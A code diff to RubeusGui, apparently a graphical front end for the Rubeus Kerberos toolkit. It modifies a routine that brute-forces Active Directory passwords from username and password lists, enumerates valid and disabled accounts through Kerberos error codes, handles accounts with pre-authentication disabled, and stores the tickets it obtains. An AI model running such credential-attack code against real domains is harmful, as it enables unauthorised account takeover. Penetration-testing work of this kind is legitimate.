@@ -27,7 +27,7 @@ namespace RubeusGui
         /// <summary>
         /// Returns true if it finished testing all usernames and passwords. Returns false if it was cancelled by user before completing
         /// </summary>
-        public bool Run(string domain, string dc, List<string> usernames, List<string> passwords, bool runParallel)
+        public bool Run(string domain, string dc, List<string> usernames, List<string> passwords, bool runParallel, bool skipNoPreAuth)
         {
             _cancelToken = new CancellationTokenSource();
             if (runParallel)
@@ -51,7 +51,7 @@ namespace RubeusGui
                         else
                         {
                             _alreadyProcessedUsersParallel.Add(username);
-                            TestPasswords(domain, dc, username, passwords);
+                            TestPasswords(domain, dc, username, passwords, skipNoPreAuth);
                         }
                     });
                 }
@@ -78,14 +78,14 @@ namespace RubeusGui
                     else
                     {
                         _alreadyProcessedUsers.Add(username);
-                        TestPasswords(domain, dc, username, passwords);
+                        TestPasswords(domain, dc, username, passwords, skipNoPreAuth);
                     }
                 }
                 return true;
             }
         }
 
-        private void TestPasswords(string domain, string dc, string username, List<string> passwords)
+        private void TestPasswords(string domain, string dc, string username, List<string> passwords, bool skipNoPreAuth)
         {
             BruteResult result = new BruteResult(username);
             foreach (string password in passwords)
@@ -100,18 +100,16 @@ namespace RubeusGui
                     try
                     {
                         Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
-                        string hash = Helpers.EncryptPassword(domain, username, password, etype);
-                        byte[] tgtBytes = Ask.InnerTGT(AS_REQ.NewASReq(username, domain, hash, etype), etype, null, false, dc);
+                        KRB_CRED tgt = Ask.TGTFromPassword(username, domain, password, etype, null, false, dc, skipNoPreAuth: skipNoPreAuth);
+
                         // If we made it this far then credentials must be valid
                         result.Password = password;
                         result.Status = BruteResult.CredentialStatus.UsernameAndPwdValid;
-                        result.Tgt = tgtBytes;
+                        result.Tgt = tgt.RawBytes;
                     }
-                    catch (KerberosErrorException kerbEx)
+                    catch (KerberosException kerbEx)
                     {
-                        // Most kerberos errors will only appear if the username is valid (other than C_PRINCIPAL_UNKNOWN) so if we're hitting this Catch block then assume the username is valid 
-
-                        var errorInfo = (Interop.KERBEROS_ERROR)kerbEx.NativeKrbError.error_code;
+                        var errorInfo = kerbEx.ErrorType;
                         switch (errorInfo)
                         {
                             // PREAUTH_FAILED is returned when we try an incorrect password with a valid username, so its the only scenario where we actually want to keep trying
@@ -131,11 +129,17 @@ namespace RubeusGui
                                 result.Status = BruteResult.CredentialStatus.UsernameValidButDisabled;
                                 break;
                             default:
-                                // If we got any other kerberos error then the username is almost certainly valid as we did not get KDC_ERR_C_PRINCIPAL_UNKNOWN
+                                // If we got any other kerberos error then the username is almost certainly valid as we did not get PRINCIPAL_UNKNOWN
                                 result.Status = BruteResult.CredentialStatus.UsernameValid;
                                 // Feels a bit janky throwing an exception here just to catch it a couple of lines later but I still prefer it over the alternatives
-                                throw new RubeusException("Server responded with error code " + (int)errorInfo + " (" + errorInfo + ") - " + Helpers.GetFriendlyNameForKrbErrorCode(errorInfo));
+                                throw new RubeusException("Server responded with error code " + (int)errorInfo + " (" + errorInfo + ") - " + Helpers.GetDescriptionForKrbErrorCode(errorInfo));
                         }
+                    }
+                    catch (TicketDecryptException decryptEx) when (decryptEx.Ticket == Ask.TicketType.NoPreAuthTgt)
+                    {
+                        // We should only end up here if the username exists and has pre-auth disabled and we have the wrong password
+                        result.Status = BruteResult.CredentialStatus.UsernameValid;
+                        tryMorePasswords = true;
                     }
                 }
                 catch (Exception ex) // Catch any general exceptions as well as any kerberos ones we re-threw above
@@ -160,6 +164,5 @@ namespace RubeusGui
 
             ResultAdded?.Invoke(this, result);
         }
-
     }
 }
